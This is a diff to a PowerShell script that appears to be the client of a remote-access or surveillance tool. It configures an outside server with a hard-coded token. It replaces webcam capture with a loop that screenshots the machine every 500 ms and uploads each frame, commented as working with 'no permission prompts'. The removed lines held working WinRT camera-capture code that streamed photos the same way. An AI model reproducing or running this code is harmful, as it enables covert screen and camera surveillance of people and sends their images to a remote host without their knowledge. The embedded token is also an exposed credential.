@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.7"
+$Version = "3.1.8"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -415,51 +415,20 @@ function ScreenshotJpeg {
     `$bmp.Dispose()
     return `$ms.ToArray()
 }
-# --- Try WinRT camera first, fall back to screenshot ---
-`$usedScreen=`$false
+# --- Screenshot stream (no camera access, no permission prompts) ---
+`$i=0
 try {
-    Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
-    [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
-    [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
-    [void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
-    [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
-    function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if(`$t.IsFaulted){throw `$t.Exception.InnerException}; return `$t.Result }
-    `$device=[Windows.Media.Capture.MediaCapture]::new()
-    Await(`$device.InitializeAsync()) | Out-Null
-    `$enc=[Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
-    `$i=0
     while (`$true) {
         try {
-            `$ras=[Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
-            Await(`$device.CapturePhotoToStreamAsync(`$enc,`$ras)) | Out-Null
-            `$ras.Seek(0);`$dr=[Windows.Storage.Streams.DataReader]::new(`$ras);Await(`$dr.LoadAsync([uint32]`$ras.Size)) | Out-Null
-            `$bytes=[byte[]]::new(`$ras.Size);`$dr.ReadBytes(`$bytes);`$dr.Dispose();`$ras.Dispose()
+            `$bytes = ScreenshotJpeg
             UploadFrame `$bytes
             `$i++
         } catch { break }
         if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
-        Start-Sleep -Milliseconds 200
+        Start-Sleep -Milliseconds 500
     }
-    try { `$device.Dispose() } catch {}
 } catch {
-    `$camErr = `$_.Exception.Message
-    Report "[!] Camera (WinRT) failed: `$camErr -- falling back to screen capture`n"
-    `$usedScreen=`$true
-    # --- Screenshot fallback ---
-    try {
-        `$i=0
-        while (`$true) {
-            try {
-                `$bytes = ScreenshotJpeg
-                UploadFrame `$bytes
-                `$i++
-            } catch { break }
-            if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
-            Start-Sleep -Milliseconds 500
-        }
-    } catch {
-        Report "[!] Screenshot fallback also failed: `$(`$_.Exception.Message)`n"
-    }
+    Report "[!] Screenshot stream failed: `$(`$_.Exception.Message)`n"
 }
 "@
         try {
@@ -539,55 +508,19 @@ try {
             $bmp.Dispose()
             return $ms.ToArray()
         }
-        # Try WinRT camera, fall back to screenshot
-        $cameraOk = $false
+        # Screenshot stream (no camera access, no permission prompts)
+        $i = 0
         try {
-            Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
-            [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
-            [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
-            [void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
-            [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
-            $device = [Windows.Media.Capture.MediaCapture]::new()
-            $initTask = [System.WindowsRuntimeSystemExtensions]::AsTask($device.InitializeAsync())
-            $initTask.Wait()
-            if ($initTask.IsFaulted) { throw $initTask.Exception.InnerException }
-            $cameraOk = $true
-            $enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
             while ($sharedState.CameraRunning) {
                 try {
-                    $ras = [Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
-                    $ct = [System.WindowsRuntimeSystemExtensions]::AsTask($device.CapturePhotoToStreamAsync($enc, $ras))
-                    $ct.Wait()
-                    if ($ct.IsFaulted) { throw $ct.Exception.InnerException }
-                    $ras.Seek(0)
-                    $dr = [Windows.Storage.Streams.DataReader]::new($ras)
-                    $lt = [System.WindowsRuntimeSystemExtensions]::AsTask($dr.LoadAsync([uint32]$ras.Size))
-                    $lt.Wait()
-                    $bytes = [byte[]]::new($ras.Size)
-                    $dr.ReadBytes($bytes)
-                    $dr.Dispose(); $ras.Dispose()
+                    $bytes = ScreenshotJpeg
                     UploadFrame $bytes
+                    $i++
                 } catch { break }
-                Start-Sleep -Milliseconds 200
+                Start-Sleep -Milliseconds 500
             }
-            try { $device.Dispose() } catch {}
         } catch {
-            $camErr = $_.Exception.Message
-            if (-not $cameraOk) {
-                Report "[!] Camera (WinRT) failed: $camErr -- falling back to screen capture`n"
-                # Screenshot fallback
-                try {
-                    while ($sharedState.CameraRunning) {
-                        try {
-                            $bytes = ScreenshotJpeg
-                            UploadFrame $bytes
-                        } catch { break }
-                        Start-Sleep -Milliseconds 500
-                    }
-                } catch {
-                    Report "[!] Screenshot fallback also failed: $($_.Exception.Message)`n"
-                }
-            }
+            Report "[!] Screenshot stream failed: $($_.Exception.Message)`n"
         } finally {
             $sharedState.CameraRunning = $false
         }
